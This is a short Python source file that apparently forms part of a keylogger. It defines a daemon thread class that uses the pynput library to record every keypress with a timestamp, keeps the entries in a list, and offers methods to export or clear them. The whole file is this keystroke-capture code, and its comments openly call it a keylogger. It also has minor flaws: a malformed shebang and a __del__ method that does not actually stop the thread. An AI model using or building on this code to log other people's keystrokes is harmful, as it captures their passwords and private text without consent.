#/usr/bin/python3
import threading                                         # keylogger runs on seperate thread
from pynput.keyboard import Key, Listener                # pynput library for keyboard
import datetime                                          # get current time of key-press
import time            
class Logger(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.log = []
        self.daemon = True                               # daemon thread , so it exits when main program ends

    def run(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def on_press(self,key):
        # print("Pressed - " + str(key))
        self.time = str(datetime.datetime.now())[:-4]        # no need of microsecond accuracy in keypress times.
        self.string = str(self.time)+"-" + str(key) + "\n"   # still change if required
        self.log.append(self.string)                         # append to log list 
        #print(self.string)
    
    def export_log(self):                                    # send logs as a list
        return self.log
    
    def clear_log(self):                                     # clear the logs
        self.log = []
    
    def __del__(self):                                       # __del__ makes sure thread is stopped!
        self.is_alive = False
